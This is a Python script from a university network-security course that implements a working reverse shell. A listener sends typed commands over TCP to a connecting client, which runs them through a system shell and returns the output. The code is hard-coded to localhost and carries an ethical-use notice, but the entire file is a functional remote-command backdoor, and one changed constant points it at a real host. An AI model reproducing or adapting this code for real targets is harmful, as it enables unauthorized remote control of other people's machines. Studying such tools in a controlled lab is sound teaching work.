"""
Educational Payload - Reverse Shell Demo
Course: 605346 - Information & Network Security Programming
Phase 2 - Offensive Scripting & Reconnaissance Toolkit

╔══════════════════════════════════════════════════════════════════╗
║              ETHICAL USE NOTICE - READ BEFORE RUNNING            ║
║                                                                  ║
║  This script is for EDUCATIONAL PURPOSES ONLY.                   ║
║  It connects exclusively to LOCALHOST (127.0.0.1).               ║
║  DO NOT modify the host to point to any external system.         ║
║  DO NOT run this outside of a controlled lab environment.        ║
║  Unauthorized use is illegal under cybercrime laws and           ║
║  violates UOP academic honesty policy.                           ║
║  The authors accept no responsibility for misuse.                ║
╚══════════════════════════════════════════════════════════════════╝

HOW TO TEST (sandboxed - localhost only):
  Step 1 - Open terminal A (listener):
      python payload.py listen

  Step 2 - Open terminal B (shell):
      python payload.py shell

  Both must run on the same machine. No external network traffic.
"""

import socket
import subprocess
import threading
import sys


# ── SAFETY LOCK ───────────────────────────────────────────────────────────────
# Hard-coded to localhost. This cannot be changed via arguments.
HOST = "127.0.0.1"
PORT = 4444


def print_disclaimer():
    print("=" * 60)
    print("  EDUCATIONAL PAYLOAD - LOCALHOST ONLY")
    print("  For authorized lab use. Do not misuse.")
    print(f"  Target: {HOST}:{PORT} (localhost only)")
    print("=" * 60)


# ── LISTENER (attacker side) ──────────────────────────────────────────────────

def run_listener():
    """Start a listener that receives the reverse shell connection."""
    print_disclaimer()
    print(f"\n[*] Listener started on {HOST}:{PORT} — waiting for connection...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)

    conn, addr = server.accept()
    print(f"[+] Connection received from {addr}")
    print("[*] Type commands below. Type 'exit' to quit.\n")

    try:
        while True:
            cmd = input("shell> ").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                conn.send(b"exit\n")
                break
            conn.send((cmd + "\n").encode())
            output = conn.recv(4096).decode(errors="ignore")
            print(output)
    except KeyboardInterrupt:
        pass
    finally:
        conn.close()
        server.close()
        print("\n[*] Listener closed.")


# ── REVERSE SHELL (victim side) ───────────────────────────────────────────────

def run_shell():
    """Connect back to the listener and execute received commands."""
    print_disclaimer()
    print(f"\n[*] Connecting to listener at {HOST}:{PORT}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        print("[+] Connected.")

        while True:
            cmd = sock.recv(1024).decode().strip()
            if not cmd or cmd == "exit":
                break
            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=10
                )
                output = result.stdout + result.stderr
            except subprocess.TimeoutExpired:
                output = "[!] Command timed out\n"
            except Exception as e:
                output = f"[!] Error: {e}\n"
            sock.send(output.encode())

    except ConnectionRefusedError:
        print(f"[!] Could not connect to {HOST}:{PORT}. Start the listener first.")
    finally:
        sock.close()
        print("[*] Shell closed.")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 2 or sys.argv[1] not in ("listen", "shell"):
        print(__doc__)
        print("Usage:")
        print("  python payload.py listen   # Start the listener (Terminal A)")
        print("  python payload.py shell    # Start the reverse shell (Terminal B)")
        sys.exit(1)

    if sys.argv[1] == "listen":
        run_listener()
    elif sys.argv[1] == "shell":
        run_shell()


if __name__ == "__main__":
    main()
